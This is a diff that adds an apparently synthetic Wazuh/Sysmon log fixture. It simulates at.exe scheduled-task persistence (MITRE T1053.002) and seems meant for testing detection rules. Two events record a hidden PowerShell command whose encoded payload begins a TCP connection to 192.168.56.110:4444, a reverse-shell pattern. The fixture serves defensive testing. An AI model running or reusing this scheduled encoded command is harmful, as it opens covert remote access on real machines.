@@ -1,0 +1,231 @@
+{
+  "metadata": {
+    "campaign": "35",
+    "batch": "16",
+    "format": "wazuh-native",
+    "attack_id": "T1053.002",
+    "variation": "001",
+    "name": "At (Windows) - Legacy Scheduled Task",
+    "description": "Use deprecated at.exe to schedule persistent PowerShell payload",
+    "expected_detection": "HIGH",
+    "kill_chain_phase": "persistence"
+  },
+  "logs": [
+    {
+      "sequence": 1,
+      "timestamp": "2026-02-10T16:02:00.000Z",
+      "log": {
+        "timestamp": "2026-02-10T16:02:00.000-0500",
+        "rule": {
+          "level": 12,
+          "description": "Sysmon - Event 1: at.exe execution for scheduled task creation",
+          "id": "100101",
+          "mitre": {
+            "id": [
+              "T1053.002"
+            ],
+            "tactic": [
+              "Persistence",
+              "Execution"
+            ],
+            "technique": [
+              "At (Windows)"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1707580920.000001",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-10 16:02:00.000",
+              "processGuid": "{c1d2e3f4-1003-65a8-0000-001000000000}",
+              "processId": "5432",
+              "image": "C:\\Windows\\System32\\at.exe",
+              "commandLine": "at.exe 16:05 /interactive powershell.exe -WindowStyle Hidden -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADUANgAuADEAMQAwACIALAA0ADQANAA0ACkA",
+              "currentDirectory": "C:\\Users\\attacker\\",
+              "user": "CORP\\attacker",
+              "integrityLevel": "High",
+              "hashes": "SHA256=B8F3A9D1E7C2B4A5F8E6D9C2A3B4C5D6E7F8A9B0C1D2E3F4A5B6C7D8E9F0A1B2",
+              "parentProcessGuid": "{c1d2e3f4-1000-65a8-0000-001000000000}",
+              "parentProcessId": "4320",
+              "parentImage": "C:\\Windows\\System32\\cmd.exe",
+              "parentCommandLine": "cmd.exe"
+            }
+          }
+        },
+        "_fomorian_batch": "16",
+        "_fomorian_campaign": "35"
+      }
+    },
+    {
+      "sequence": 2,
+      "timestamp": "2026-02-10T16:02:01.000Z",
+      "log": {
+        "timestamp": "2026-02-10T16:02:01.000-0500",
+        "rule": {
+          "level": 12,
+          "description": "Sysmon - Event 11: AT task file created",
+          "id": "100111",
+          "mitre": {
+            "id": [
+              "T1053.002"
+            ],
+            "tactic": [
+              "Persistence"
+            ],
+            "technique": [
+              "At (Windows)"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event11",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1707580921.000001",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "11",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "11",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-10 16:02:01.000",
+              "processGuid": "{c1d2e3f4-1003-65a8-0000-001000000000}",
+              "processId": "5432",
+              "image": "C:\\Windows\\System32\\at.exe",
+              "targetFilename": "C:\\Windows\\Tasks\\At1.job",
+              "creationUtcTime": "2026-02-10 16:02:01.000"
+            }
+          }
+        },
+        "_fomorian_batch": "16",
+        "_fomorian_campaign": "35"
+      }
+    },
+    {
+      "sequence": 3,
+      "timestamp": "2026-02-10T16:05:00.000Z",
+      "log": {
+        "timestamp": "2026-02-10T16:05:00.000-0500",
+        "rule": {
+          "level": 12,
+          "description": "Sysmon - Event 1: Scheduled PowerShell execution via at.exe",
+          "id": "100101",
+          "mitre": {
+            "id": [
+              "T1053.002",
+              "T1059.001"
+            ],
+            "tactic": [
+              "Persistence",
+              "Execution"
+            ],
+            "technique": [
+              "At (Windows)",
+              "PowerShell"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1707581100.000001",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-10 16:05:00.000",
+              "processGuid": "{c1d2e3f4-1004-65a8-0000-001000000000}",
+              "processId": "6543",
+              "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "commandLine": "powershell.exe -WindowStyle Hidden -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADUANgAuADEAMQAwACIALAA0ADQANAA0ACkA",
+              "currentDirectory": "C:\\Windows\\System32\\",
+              "user": "CORP\\attacker",
+              "integrityLevel": "High",
+              "hashes": "SHA256=A9D2F1E8C3B6A4F7E9D1C2B3A4C5D6E7F8A9B0C1D2E3F4A5B6C7D8E9F0A1B2C3",
+              "parentProcessGuid": "{c1d2e3f4-1005-65a8-0000-001000000000}",
+              "parentProcessId": "1234",
+              "parentImage": "C:\\Windows\\System32\\taskeng.exe",
+              "parentCommandLine": "taskeng.exe"
+            }
+          }
+        },
+        "_fomorian_batch": "16",
+        "_fomorian_campaign": "35"
+      }
+    }
+  ]
+}
